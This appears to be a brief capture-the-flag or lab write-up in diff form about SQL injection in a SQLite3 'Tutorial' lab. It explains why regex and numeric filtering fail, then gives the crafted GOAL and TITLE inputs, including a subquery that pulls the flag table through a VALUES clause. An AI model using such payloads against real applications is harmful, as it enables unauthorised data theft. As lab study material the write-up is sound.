@@ -1,0 +1,14 @@
+LAB: Tutorial, SQLite3
+
+Vuln Type: slqi
+
+Trusted point: goal and title;
+The application trusted that user input could safely be embedded into a SQL VALUES clause after superficial filtering (regex + numeric checks), without enforcing structure or using parameterization.
+
+
+METHOD
+inputs: GOAL '-1'
+        TITLE "Hello
+               1,
+               (SELECT flag FROM flag))--"
+               
